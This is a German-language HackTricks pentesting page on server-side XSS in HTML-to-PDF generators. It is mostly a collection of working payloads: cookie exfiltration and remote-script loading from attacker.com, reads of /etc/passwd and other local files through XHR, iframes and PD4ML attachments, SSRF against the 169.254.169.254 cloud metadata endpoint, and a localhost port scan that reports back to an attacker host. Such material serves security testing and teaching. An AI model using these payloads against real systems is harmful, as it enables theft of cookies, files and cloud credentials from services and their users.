# Serverseitiges XSS (dynamisches PDF)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories** senden.

</details>

## Serverseitiges XSS (dynamisches PDF)

Wenn eine Webseite ein PDF unter Verwendung von benutzerkontrollierten Eingaben erstellt, k√∂nnen Sie versuchen, den **Bot zu t√§uschen**, der das PDF erstellt, um **beliebigen JS-Code auszuf√ºhren**.\
Wenn der **PDF-Erstellungs-Bot** bestimmte **HTML-Tags** findet, wird er sie **interpretieren**, und Sie k√∂nnen dieses Verhalten missbrauchen, um ein **Serverseitiges XSS** zu verursachen.

Bitte beachten Sie, dass die `<script></script>`-Tags nicht immer funktionieren, daher ben√∂tigen Sie eine andere Methode, um JS auszuf√ºhren (z. B. Missbrauch von `<img` ).\
Beachten Sie auch, dass Sie bei einer regul√§ren Ausnutzung in der Lage sein werden, das erstellte PDF zu **sehen/herunterzuladen**, sodass Sie alles, was Sie √ºber JS schreiben, sehen k√∂nnen (z. B. mit `document.write()`). Wenn Sie das erstellte PDF jedoch **nicht sehen k√∂nnen**, m√ºssen Sie wahrscheinlich die Informationen extrahieren, indem Sie Webanfragen an sich selbst senden (Blind).

### Beliebte PDF-Generierung

- **wkhtmltopdf** ist bekannt f√ºr seine F√§higkeit, HTML und CSS in PDF-Dokumente umzuwandeln und dabei die WebKit-Rendering-Engine zu nutzen. Dieses Tool ist als Open-Source-Befehlszeilenprogramm verf√ºgbar und somit f√ºr eine Vielzahl von Anwendungen zug√§nglich.
- **TCPDF** bietet eine robuste L√∂sung innerhalb des PHP-√ñkosystems f√ºr die PDF-Erstellung. Es ist in der Lage, Bilder, Grafiken und Verschl√ºsselung zu verarbeiten und zeigt seine Vielseitigkeit bei der Erstellung komplexer Dokumente.
- F√ºr diejenigen, die in einer Node.js-Umgebung arbeiten, bietet **PDFKit** eine praktikable Option. Es erm√∂glicht die Erzeugung von PDF-Dokumenten direkt aus HTML und CSS und stellt eine Verbindung zwischen Webinhalten und druckbaren Formaten her.
- Java-Entwickler bevorzugen m√∂glicherweise **iText**, eine Bibliothek, die nicht nur die Erstellung von PDFs erleichtert, sondern auch fortgeschrittene Funktionen wie digitale Signaturen und Formularausf√ºllung unterst√ºtzt. Ihr umfangreicher Funktionsumfang macht sie f√ºr die Erzeugung sicherer und interaktiver Dokumente geeignet.
- **FPDF** ist eine weitere PHP-Bibliothek, die sich durch ihre Einfachheit und Benutzerfreundlichkeit auszeichnet. Sie wurde f√ºr Entwickler entwickelt, die einen unkomplizierten Ansatz zur PDF-Erstellung suchen, ohne umfangreiche Funktionen zu ben√∂tigen.


## Payloads

### Entdeckung
```markup
<!-- Basic discovery, Write somthing-->
<img src="x" onerror="document.write('test')" />
<script>document.write(JSON.stringify(window.location))</script>
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>

<!--Basic blind discovery, load a resource-->
<img src="http://attacker.com"/>
<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
<script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
<link rel=attachment href="http://attacker.com">
```
### SVG

Jeder der vorherigen oder folgenden Payloads kann innerhalb dieses SVG-Payloads verwendet werden. Ein Iframe, das auf die Burpcollab-Subdomain zugreift, und ein weiteres, das auf den Metadaten-Endpunkt zugreift, werden als Beispiele angegeben.
```markup
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="root" width="800" height="500">
<g>
<foreignObject width="800" height="500">
<body xmlns="http://www.w3.org/1999/xhtml">
<iframe src="http://redacted.burpcollaborator.net" width="800" height="500"></iframe>
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
</body>
</foreignObject>
</g>
</svg>


<svg width="100%" height="100%" viewBox="0 0 100 100"
xmlns="http://www.w3.org/2000/svg">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>
<script type="text/javascript">
// <![CDATA[
alert(1);
// ]]>
</script>
</svg>
```
Sie k√∂nnen viele **andere SVG-Payloads** unter [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet) finden.

### Pfadoffenlegung
```markup
<!-- If the bot is accessing a file:// path, you will discover the internal path
if not, you will at least have wich path the bot is accessing -->
<img src="x" onerror="document.write(window.location)" />
<script> document.write(window.location) </script>
```
### Laden Sie ein externes Skript

Der beste Weg, diese Schwachstelle auszunutzen, besteht darin, die Schwachstelle zu missbrauchen, um den Bot dazu zu bringen, ein von Ihnen lokal kontrolliertes Skript zu laden. Anschlie√üend k√∂nnen Sie das Payload lokal √§ndern und den Bot jedes Mal mit demselben Code laden lassen.
```markup
<script src="http://attacker.com/myscripts.js"></script>
<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>
```
### Lokale Datei lesen / SSRF

{% hint style="warning" %}
√Ñndern Sie `file:///etc/passwd` beispielsweise in `http://169.254.169.254/latest/user-data`, um **zu versuchen, auf eine externe Webseite zuzugreifen (SSRF)**.

Wenn SSRF erlaubt ist, Sie jedoch **keine interessante Domain oder IP erreichen k√∂nnen**, [√ºberpr√ºfen Sie diese Seite auf m√∂gliche Umgehungen](../ssrf-server-side-request-forgery/url-format-bypass.md).
{% endhint %}
```markup
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

```markup
<script>
xhzeem = new XMLHttpRequest();
xhzeem.onload = function(){document.write(this.responseText);}
xhzeem.onerror = function(){document.write('failed!')}
xhzeem.open("GET","file:///etc/passwd");
xhzeem.send();
</script>
```

```markup
<iframe src=file:///etc/passwd></iframe>
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///root/secret.txt">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id=portal>
<embed src="file:///etc/passwd>" width="400" height="400">
<style><iframe src="file:///etc/passwd">
<img src='x' onerror='document.write('<iframe src=file:///etc/passwd></iframe>')'/>&text=&width=500&height=500
<meta http-equiv="refresh" content="0;url=file:///etc/passwd" />
```

```markup
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```
### Bot-Verz√∂gerung

Bots k√∂nnen manchmal Verz√∂gerungen aufweisen, die dazu f√ºhren, dass sie nicht sofort auf Anfragen reagieren. Dies kann verschiedene Gr√ºnde haben, wie z.B. Netzwerk√ºberlastung, Serverauslastung oder die Implementierung von Wartezeiten in den Bot-Code, um eine √úberlastung zu vermeiden. Es ist wichtig, diese Verz√∂gerungen bei der Interaktion mit Bots zu ber√ºcksichtigen, um eine reibungslose Kommunikation sicherzustellen.
```markup
<!--Make the bot send a ping every 500ms to check how long does the bot wait-->
<script>
let time = 500;
setInterval(()=>{
let img = document.createElement("img");
img.src = `https://attacker.com/ping?time=${time}ms`;
time += 500;
}, 500);
</script>
<img src="https://attacker.com/delay">
```
### Port Scan

Ein Port-Scan ist ein Verfahren, bei dem ein Angreifer versucht, offene Ports auf einem Zielrechner zu identifizieren. Ein Port ist eine numerische Adresse, die es erm√∂glicht, Netzwerkdienste zu identifizieren und zu unterscheiden. Durch das Scannen von Ports kann ein Angreifer potenzielle Schwachstellen im Netzwerk identifizieren und m√∂glicherweise Zugriff auf den Zielrechner erlangen.

Es gibt verschiedene Arten von Port-Scans, darunter der SYN-Scan, der ACK-Scan, der FIN-Scan und der XMAS-Scan. Jeder Scan-Typ verwendet unterschiedliche Techniken, um Informationen √ºber die offenen Ports zu sammeln.

Ein Port-Scan kann sowohl f√ºr legitime als auch f√ºr b√∂sartige Zwecke verwendet werden. Im Rahmen einer Penetrationstest kann ein Port-Scan verwendet werden, um Schwachstellen in einem Netzwerk zu identifizieren und zu beheben. Auf der anderen Seite kann ein Angreifer einen Port-Scan durchf√ºhren, um nach potenziellen Zielen f√ºr Angriffe zu suchen.

Es ist wichtig zu beachten, dass das Durchf√ºhren eines Port-Scans ohne Zustimmung des Eigent√ºmers des Zielrechners illegal sein kann. Es ist daher wichtig, die geltenden Gesetze und Vorschriften zu beachten und nur autorisierte Port-Scans durchzuf√ºhren.
```markup
<!--Scan local port and receive a ping indicating which ones are found-->
<script>
const checkPort = (port) => {
fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
let img = document.createElement("img");
img.src = `http://attacker.com/ping?port=${port}`;
});
}

for(let i=0; i<1000; i++) {
checkPort(i);
}
</script>
<img src="https://attacker.com/startingScan">
```
### [SSRF](../ssrf-server-side-request-forgery/)

Diese Schwachstelle kann sehr einfach in eine SSRF umgewandelt werden (da Sie das Skript dazu bringen k√∂nnen, externe Ressourcen zu laden). Versuchen Sie also einfach, sie auszunutzen (lesen Sie einige Metadaten?).

### Anh√§nge: PD4ML

Es gibt einige HTML-2-PDF-Engines, die es erm√∂glichen, **Anh√§nge f√ºr das PDF anzugeben**, wie zum Beispiel **PD4ML**. Sie k√∂nnen diese Funktion missbrauchen, um **beliebige lokale Dateien** an das PDF anzuh√§ngen.\
Um den Anhang zu √∂ffnen, habe ich die Datei mit **Firefox ge√∂ffnet und das Symbol f√ºr die B√ºroklammer doppelgeklickt**, um den Anhang als neue Datei zu **speichern**.\
Das Erfassen der **PDF-Antwort** mit Burp sollte auch den Anhang im Klartext innerhalb des PDFs **anzeigen**.

{% code overflow="wrap" %}
```html
<!-- From https://0xdf.gitlab.io/2021/04/24/htb-bucket.html -->
<html><pd4ml:attachment src="/etc/passwd" description="attachment sample" icon="Paperclip"/></html>
```
{% endcode %}

## Referenzen

* [https://lbherrera.github.io/lab/h1415-ctf-writeup.html](https://lbherrera.github.io/lab/h1415-ctf-writeup.html)
* [https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
* [https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
* [https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c](https://infosecwriteups.com/breaking-down-ssrf-on-pdf-generation-a-pentesting-guide-66f8a309bf3c)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
